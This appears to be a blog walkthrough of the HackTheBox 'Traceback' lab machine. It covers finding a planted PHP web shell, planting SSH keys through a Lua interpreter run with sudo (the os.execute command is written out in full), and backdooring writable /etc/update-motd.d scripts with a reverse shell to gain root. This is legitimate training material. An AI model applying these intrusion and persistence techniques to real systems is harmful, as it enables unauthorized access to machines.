---
title: Hackthebox - Traceback
author: Corshine
date: 2020-08-14 22:21:00 +0700
categories: [Hackthebox]
tags: [Lua, Php, Webshell, Ssh, Update-motd.d]
image: /assets/img/Post/Traceback.jpeg
---

>   **The information provided in this site is for educational purposes regarding pentesting. The author of the site will not be held any responsibility for any misuse of the information from this site.**


## **<span style='color:#ff5555'>Summary</span>**
***

- Searching for web shell
- Reverse shell it as web admin
- Read the .**bash_history** and found that I may run the `luvit` with privesc.lua on user
- Run the `luvit script` with privesc.lua to get into another **user**
- Add my **ssh** public key to `authorized_keys`
- Execute the **luvit** file
- Put `ssh` keys into **/home/sysadmin/.ssh/authorized_keys**
- Login as **sysadmin** with **ssh**
- Capture `user.txt`
- Found `update-motd.d` with **write** permissiont to all **files**
- Modify `/etc/update-motd.d/00-header` script with `bash` **reverse shell** in order to get `root`
- Capture `root.txt`


## **<span style='color:#ff5555'>Nmap</span>**
***

```
root@lordcorshine:~/htb/traceback# nmap -sCV -T4 -oA nmap/output traceback.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 10:21 WIB
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
root@lordcorshine:~/htb/traceback# 
```

## **<span style='color:#ff5555'>Port 80</span>**
***

![]({{ "/images/htb/traceback/port80.png" | relative_url }})

I ran `Gobuster` with **dirbuster** wordlist against it and found nothing **interesting**.

![]({{ "/images/htb/traceback/gobuster1.png" | relative_url }})

Check the page source, there's actually a **hint**.

![]({{ "/images/htb/traceback/sourcewebpage1.png" | relative_url }})

I decided to search on google with keyword `web shells` based on the **source code** and stumbled on this tool called [Web-Shells](https://github.com/TheBinitGhimire/Web-Shells)



## **<span style='color:#ff5555'>Create a wordlist</span>**
***

Copy all of the **php** files into 1 file called `wordlist`.

![]({{ "/images/htb/traceback/makewordlist1.png" | relative_url }})

I used **vim** to do this task, and it looks like this.

![]({{ "/images/htb/traceback/wordlist1.png" | relative_url }})

Fuzz it...

## **<span style='color:#ff5555'>Fuzzing</span>**
***

Run the scan with **FFUF**.

![]({{ "/images/htb/traceback/ffuf1.png" | relative_url }})

From the result it shows **smevk.php** is the file that I can access from the web page.

The ***smevk***.php is able to execute **command** and see **directory** on the webpage itself.

![]({{ "/images/htb/traceback/smevkpage1.png" | relative_url }})

## **<span style='color:#ff5555'>Get in as low user privileges</span>**
***

So I send my **ssh** keys `/home/webadmin/.ssh/authorized_keys` on the web page.

And I'm in as `webadmin`...

![]({{ "/images/htb/traceback/userin.png" | relative_url }})

There is `note.txt` in `~`

```
webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:~$
```

And found something **interesting** which is `.bash_history` of the **user**, it looks like this person just execute the `luvit` with his own script called **privesc.lua**.

```
webadmin@traceback:~$ cat .bash_history 
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
webadmin@traceback:~$ 
```

I decided not to run `linpeas` or `pspy` because this is seems obvious that I have to escalate to `sysadmin` with **luvit**

Execute `sudo -l` with user **webadmin** also shows that I can run `luvit` as **sudo**.

## **<span style='color:#ff5555'>Escalation to higher user</span>**
***

![]({{ "/images/htb/traceback/sudol.png" | relative_url }})

And I realized that there is another user called `sysadmin` which has higher authority than `webadmin`.

![]({{ "/images/htb/traceback/2users.png" | relative_url }})

Checking [GTFOBINS](https://gtfobins.github.io/gtfobins/lua/#shell), I found there is a way to get `sysadmin`'s shell.

I decided to execute the `luvit`, it's a `lua` programming language, and send my **ssh** keys to the user `sysadmin`.


```
webadmin@traceback:/home$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDABGR3pWiG1Wz4cE6+XldqXF4yOrqCmbquMv5DvysjYGqUCMbdmr8Gql1gVn3mfiC1jVFWiCkq1BaweneadhLj4DhaJ/hsuSpNN29Pm11UdhrBbfnIJnl9BYb3Z42lt3dAIjPW9EhHc4d+rIrXnPQxuSVx9pV+cj3QhVBQQ9y78fbSXW/82fBLbGgGsmh5jAHE8ZUlMi6xhXMVsDJy3sYkWRPzAaX+/GxqIXGu6JgmZlqtR1QwUYTYhvwQa7Hs+Xj53ayt/YKhl9LCh9xFUwH6YqEnU12+0uEtOn/15y6xfBs4JuRRo05BvOxyLk5PfAHlt/GCk3COWXXoTfrrWEv0hDFR5sSel9xRIoAWXqAYkU2C543NSHu1HrJB3i0L960Ib1DW+WcXvuH9qNZeGpdX1vljTYbKgU1dViu3ACim5YhlQI5sWWe8NH+RqoLuUIQOBhJsXwvK3kZMBOZY8kpUipgMEYm1oyUTbX8wfx1Fj/IByXwO2BLYSlNG+ym8DZc= root@lordcorshine' >> /home/sysadmin/.ssh/author
ized_keys")
true    'exit'  0
> 
```

## **<span style='color:#ff5555'>Capture user.txt</span>**
***

![]({{ "/images/htb/traceback/usertxt.png" | relative_url }})

I'm in as `sysadmin` now...


## **<span style='color:#ff5555'>Escalating to root</span>**
***

By running **ps -aux**, found something **interesting**, the copy is made every 30 seconds from the **backup** to the **/update-motd.d** directory as **root**

```
$ px -aux
root       1670  0.0  0.0   4628   800 ?        Ss   21:39   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
sysadmin   1731  0.0  0.0  14428  1104 pts/0    S+   21:39   0:00 grep motd
```

Also the **/etc/update-motd.d/** does have permission to **write**.

```
$ cd /etc/update-motd.d/
$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug 11 21:53 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug 11 21:53 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug 11 21:53 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug 11 21:53 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug 11 21:53 91-release-upgrade
$ 
```

## **<span style='color:#ff5555'>Reverse Shell</span>**
***


All of the files have **write** permission, so I choose to edit **00-header**.

![]({{ "/images/htb/traceback/defaultheader00.png" | relative_url }})


This is the default file from **/etc/update-motd.d/** which I'm going to put my **reverse shell** inside the file and listen with **netcat**.

![]({{ "/images/htb/traceback/editedscript.png" | relative_url }})

And this is the **file** that I put my **reverse shell** which will give me **root** to the machine.

Send **nc** to the **sysadmin** on `/tmp` directory with **scp**.

```
root@lordcorshine:~/htb/traceback# l
total 56K
drwxr-xr-x 5 root root 4.0K Aug 12 11:18 .
drwxr-xr-x 6 root root 4.0K Aug 12 10:08 ..
drwxr-xr-x 2 root root 4.0K Aug 12 10:19 exploit
-rwxr-xr-x 1 root root  35K Aug 12 11:18 nc
drwxr-xr-x 2 root root 4.0K Aug 12 10:20 nmap
drwxr-xr-x 3 root root 4.0K Aug 12 11:07 Web-Shells
root@lordcorshine:~/htb/traceback# scp -i ~/.ssh/id_rsa nc sysadmin@traceback.htb:/tmp
################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
nc
```

Quick check the **NC** is on `/tmp`

```
$ ls -la
total 84
drwxrwxrwt 12 root     root      4096 Aug 11 21:47 .
drwxr-xr-x 22 root     root      4096 Aug 25  2019 ..
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 .font-unix
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 .ICE-unix
-rwxr-xr-x  1 sysadmin sysadmin 35520 Aug 11 21:47 nc
drwx------  3 root     root      4096 Aug 11 21:17 systemd-private-61e7854a51734d09a1af240f2815b85a-apache2.service-Ivbqkb
drwx------  3 root     root      4096 Aug 11 21:17 systemd-private-61e7854a51734d09a1af240f2815b85a-systemd-resolved.service-XUcyXs
drwx------  3 root     root      4096 Aug 11 21:17 systemd-private-61e7854a51734d09a1af240f2815b85a-systemd-timesyncd.service-Au30ij
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 .Test-unix
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 VMwareDnD
drwx------  2 root     root      4096 Aug 11 21:31 vmware-root_411-1816005628
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 .X11-unix
drwxrwxrwt  2 root     root      4096 Aug 11 21:17 .XIM-unix
$ 
```

Also fire the listener with **netcat**.

Now I just need to exit from the **user** and login back with **ssh** and the script will be automatically executed because of the **bash reverse shell** that I put on `/etc/update-motd.d/00-header` will trigger it and give me the **root** shell.

![]({{ "/images/htb/traceback/roottxt.png" | relative_url }})

***

![]({{ "/images/mandatory/pwned.png" | relative_url }})